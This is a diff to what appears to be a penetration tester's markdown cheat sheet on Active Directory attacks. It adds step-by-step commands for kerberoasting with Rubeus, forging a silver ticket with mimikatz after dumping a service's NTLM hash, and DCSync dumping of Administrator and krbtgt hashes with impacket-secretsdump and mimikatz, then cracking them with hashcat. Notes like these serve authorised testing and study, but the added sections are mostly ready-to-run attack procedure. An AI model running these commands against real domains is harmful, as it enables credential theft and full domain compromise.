@@ -121,8 +121,50 @@ $ hashcat -m 13100 spn_hash_to_hack.txt /usr/share/wordlist/rockyou.txt -r myrul
 ```
 PS c:\path\to\rubeus> .\Rubeus.exe kerberoast /outfile:spn_hash_to_hack.txt
 ```
-and crack it with `hashcat`
+and crack it with `hashcat`. With `GenericWrite` or `GenericAll` permissions on another AD user: 
+- https://adsecurity.org/?p=3658 (to avoid)
+- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
 
 ### Silver ticket
 
+https://adsecurity.org/?p=2011
 ```
+PS > iwr -UseDefaultCredentials http://internalwebsite # access denied
+PS > c:\path\to\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords # get the webserver's service NTLM hash
+PS > whoami /user # get the domain SID: S-1-5-21-xtake-ytake-ztake-donottaketheuserRID
+mimikatz # kerberos::golden /sid:domainsid /domain:organisation.com /ptt /target:internalwebsite.organisation.com /service:http /rc4:ntlmhash /user:anyuser
+mimikatz # exit
+PS > klist
+PS > iwr -UseDefaultCredentials http://internalwebsite # access granted
+```
+
+### Domain Controler Sync
+
+https://adsecurity.org/?p=2398#MimikatzDCSync
+Impacket-Secretsdump on GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
+
+#### From Linux
+
+```
+impacket-secretsdump -just-dc-user someuser organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
+hashcat -m 1000 ntlm_hash_from_impacket-secretsdump /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+impacket-secretsdump -just-dc-user Administrator organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
+impacket-secretsdump -just-dc-user krbtgt organisation.com/someadminuser:"adminpassword"@domaincontrolerIp
+```
+
+#### From Windows
+
+```
+PS > c:\path\to\mimikatz.exe
+mimikatz # lsadump::dcsync /user:mydomainname\username
+$ hashcat -m 1000 ntlm_hash_from_mimikatz /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+mimikatz # lsadump::dcsync /user:mydomainname\Administrator
+mimikatz # lsadump::dcsync /user:mydomainname\krbtgt
+```
+
+
+
